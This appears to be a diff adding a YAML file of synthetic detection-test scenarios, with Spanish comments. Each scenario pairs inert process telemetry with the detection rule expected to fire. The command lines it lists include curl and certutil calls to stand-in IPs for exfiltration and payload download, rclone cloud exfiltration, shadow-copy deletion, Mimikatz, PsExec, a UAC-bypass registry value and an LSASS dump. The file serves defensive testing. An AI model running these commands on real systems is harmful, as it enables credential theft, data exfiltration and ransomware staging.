@@ -1,0 +1,202 @@
+# Escenarios de validacion de deteccion (SIM-1/SIM-2).
+# Telemetria sintetica e inerte: el mismo esquema de eventos que
+# envia el sensor, sin ejecutar nada en ningun equipo. Cada escenario
+# declara las alertas que el motor DEBE disparar (shipped rule/sequence
+# id); el test de CI falla si una deja de detectarse.
+
+- name: 'Robo de datos: compresion y subida (sintetico)'
+  id: sim-chain-7a31-6f1d
+  description: 'Secuencia sintetica que completa la cadena: empaquetado con contrasena y subida por curl. Telemetria
+    inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1560.001
+  - t1048.003
+  host: LAB-SIM-CHAIN2
+  user: CORP\sim
+  expected:
+  - rule: 5e0c7a31-6f1d-4b8e-9a52-1c3d4e5f6a70
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4340
+      name: 7za.exe
+      command_line: 7za.exe a -pS3cret! C:\Users\Public\staged.7z C:\Users\sim\Documents
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4341
+      name: curl.exe
+      command_line: curl.exe -T C:\Users\Public\staged.7z https://203.0.113.12/upload
+- name: Robo de datos hacia la nube (sintetico)
+  id: sim-chain-8b42-7a2e
+  description: 'Secuencia sintetica que completa la cadena: archivo cifrado y rclone hacia un remoto. Telemetria
+    inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1560.001
+  - t1567.002
+  host: LAB-SIM-CHAIN2
+  user: CORP\sim
+  expected:
+  - rule: 6f1d8b42-7a2e-4c9f-8b63-2d4e5f6a7b81
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4350
+      name: 7za.exe
+      command_line: 7za.exe a -pS3cret! C:\Users\Public\staged.7z C:\Users\sim\Documents
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4351
+      name: rclone.exe
+      command_line: rclone.exe copy C:\Users\sim\Documents remoto:bucket-datos
+- name: Preparacion de ransomware (sintetico)
+  id: sim-chain-9c53-8b3f
+  description: 'Secuencia sintetica que completa la cadena: servicios parados, sombras borradas y nota de rescate.
+    Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1489
+  - t1490
+  - t1486
+  host: LAB-SIM-CHAIN2
+  user: CORP\sim
+  expected:
+  - rule: 7a2e9c53-8b3f-4da0-9c74-3e5f6a7b8c92
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4360
+      name: net.exe
+      command_line: net.exe stop "Veeam Backup Service"
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4361
+      name: vssadmin.exe
+      command_line: vssadmin.exe delete shadows /all /quiet
+  - type: file.write
+    user: CORP\sim
+    process:
+      pid: 4362
+      name: notepad.exe
+    file:
+      path: C:\Users\sim\Documents\HOW_TO_DECRYPT_FILES.html
+- name: Webshell con reconocimiento interno (sintetico)
+  id: sim-chain-ad64-9c40
+  description: 'Secuencia sintetica que completa la cadena: webshell y reconocimiento del dominio. Telemetria inerte;
+    nada se ejecuta en ningun equipo.'
+  attack:
+  - t1505.003
+  - t1087.002
+  host: LAB-SIM-CHAIN2
+  user: CORP\sim
+  expected:
+  - rule: 8b3fad64-9c40-4eb1-8d85-4f6a7b8c9da3
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 800
+      name: w3wp.exe
+      command_line: w3wp.exe -ap "Sitio Web"
+      image: C:\Apps\w3wp.exe
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4370
+      name: cmd.exe
+      ppid: 800
+      command_line: cmd.exe /c whoami
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4371
+      name: net.exe
+      command_line: net.exe group "Domain Admins" /domain
+- name: Credenciales robadas y movimiento lateral (sintetico)
+  id: sim-chain-be75-ad51
+  description: 'Secuencia sintetica que completa la cadena: Mimikatz y PsExec desde el mismo equipo. Telemetria
+    inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1003.001
+  - t1021.002
+  host: LAB-SIM-CHAIN2
+  user: CORP\sim
+  expected:
+  - rule: 9c40be75-ad51-4fc2-9e96-5a7b8c9daeb4
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4380
+      name: powershell.exe
+      command_line: powershell.exe -c Invoke-Mimikatz -DumpCreds
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4381
+      name: psexec.exe
+      command_line: psexec.exe \\LAB-SIM-TARGET -accepteula -c C:\Users\Public\p.exe
+- name: Escalada y volcado de credenciales (sintetico)
+  id: sim-chain-cf86-be62
+  description: 'Secuencia sintetica que completa la cadena: bypass de UAC y volcado de LSASS. Telemetria inerte;
+    nada se ejecuta en ningun equipo.'
+  attack:
+  - t1548.002
+  - t1003.001
+  host: LAB-SIM-CHAIN2
+  user: CORP\sim
+  expected:
+  - rule: ad51cf86-be62-40d3-8fa7-6b8c9daebfc5
+  events:
+  - type: registry.set
+    user: CORP\sim
+    process:
+      pid: 4390
+      name: explorer.exe
+    registry:
+      key: HKCU\Software\Classes\ms-settings\shell\open\command
+      operation: SetValue
+      value_name: (predeterminado)
+      value: cmd.exe /c C:\Users\Public\p.exe
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4391
+      name: rundll32.exe
+      command_line: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 744 C:\Windows\Temp\lsass.dmp full
+- name: Documento malicioso con descarga (sintetico)
+  id: sim-chain-d097-cf73
+  description: 'Secuencia sintetica que completa la cadena: documento malicioso con descarga de segunda fase. Telemetria
+    inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1566.001
+  - t1105
+  host: LAB-SIM-CHAIN2
+  user: CORP\sim
+  expected:
+  - rule: be62d097-cf73-41e4-90b8-7c9daebfc0d6
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 800
+      name: winword.exe
+      command_line: winword.exe /q /n factura.docm
+      image: C:\Apps\winword.exe
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4400
+      name: cmd.exe
+      ppid: 800
+      command_line: cmd.exe /c C:\Users\Public\p.exe
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4401
+      name: certutil.exe
+      command_line: certutil.exe -urlcache -split -f https://203.0.113.10/s.exe C:\Users\Public\s.exe
